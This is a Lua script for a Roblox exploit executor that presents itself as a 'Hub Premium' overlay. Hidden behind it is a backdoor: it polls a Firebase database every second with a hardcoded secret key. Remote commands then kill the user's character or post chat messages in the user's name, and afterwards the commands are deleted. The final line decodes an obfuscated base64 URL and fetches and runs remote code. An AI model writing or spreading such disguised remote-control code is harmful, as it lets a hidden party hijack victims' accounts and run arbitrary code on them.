local firebaseUrl = "https://gojo-hub-default-rtdb.firebaseio.com/"
local secretKey = "tAxUKU1BgidFb2xFco4FRYYz02y86gUw8ugZNjYf"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- GUI Simples
local gui = Instance.new("ScreenGui")
gui.Name = "FakeHub"
gui.Parent = playerGui
gui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 200, 0, 40)
frame.Position = UDim2.new(0.5, -100, 0, 10)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
frame.BorderSizePixel = 0
frame.Parent = gui

local label = Instance.new("TextLabel")
label.Text = "Hub Premium"
label.Size = UDim2.new(1, 0, 1, 0)
label.BackgroundTransparency = 1
label.TextColor3 = Color3.new(1, 1, 1)
label.Font = Enum.Font.GothamBold
label.TextSize = 20
label.Parent = frame

local playerName = player.Name

-- Enviar mensagem no chat Roblox
local function sendChatMessage(message)
	local success, err = pcall(function()
		local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
		if channel then
			channel:SendAsync(message)
		else
			error("Canal RBXGeneral não encontrado")
		end
	end)

	if not success then
		-- Fallback método antigo de chat
		pcall(function()
			local chatEvent = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
			chatEvent:FireServer(message, "All")
		end)
	end
end

-- Tratar comando de chat
local function handleChatCommand(data)
	local originalMessage = data.message or ""
	print("[FakeHub] Chat recebido de " .. (data.from or "unknown") .. ": " .. originalMessage)
	sendChatMessage(originalMessage)
end

-- Função para buscar e executar o comando kill
local function checkKillCommand()
	local success, response = pcall(function()
		local url = firebaseUrl .. "commands/" .. playerName .. ".json?auth=" .. secretKey
		return game:HttpGet(url)
	end)

	if success and response and response ~= "null" then
		local data = HttpService:JSONDecode(response)
		if data.action == "kill" then
			if player.Character then
				player.Character:BreakJoints()
				warn("[FakeHub] Executando comando: kill")
			end
			-- Apagar comando kill do Firebase
			pcall(function()
				local deleteUrl = firebaseUrl .. "commands/" .. playerName .. ".json?auth=" .. secretKey
				local requestFunc = (syn and syn.request) or http_request or request or (fluxus and fluxus.request) or http.request
				if requestFunc then
					requestFunc({
						Url = deleteUrl,
						Method = "DELETE",
						Headers = { ["Content-Type"] = "application/json" },
					})
					print("[FakeHub] Comando kill removido do Firebase.")
				end
			end)
		end
	end
end

-- Função para buscar e executar o comando chat
local function checkChatCommand()
	local success, response = pcall(function()
		local url = firebaseUrl .. "commands/Chat/" .. playerName .. ".json?auth=" .. secretKey
		return game:HttpGet(url)
	end)

	if success and response and response ~= "null" then
		local data = HttpService:JSONDecode(response)
		if data.action == "chat" and data.message then
			handleChatCommand(data)
			-- Apagar comando chat do Firebase
			pcall(function()
				local deleteUrl = firebaseUrl .. "commands/Chat/" .. playerName .. ".json?auth=" .. secretKey
				local requestFunc = (syn and syn.request) or http_request or request or (fluxus and fluxus.request) or http.request
				if requestFunc then
					requestFunc({
						Url = deleteUrl,
						Method = "DELETE",
						Headers = { ["Content-Type"] = "application/json" },
					})
					print("[FakeHub] Comando chat removido do Firebase.")
				end
			end)
		end
	end
end

-- Loop principal que checa os comandos de kill e chat alternadamente
local function checkCommands()
	while true do
		task.wait(1)
		checkKillCommand()
		checkChatCommand()
	end
end

coroutine.wrap(checkCommands)()
wait(1)
loadstring(game:HttpGet(base64.decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2dob3N0MTYyNjI2Ly4ucDEvcmVmcy9oZWFkcy9tYWluL1NjcmlwdA==")))();
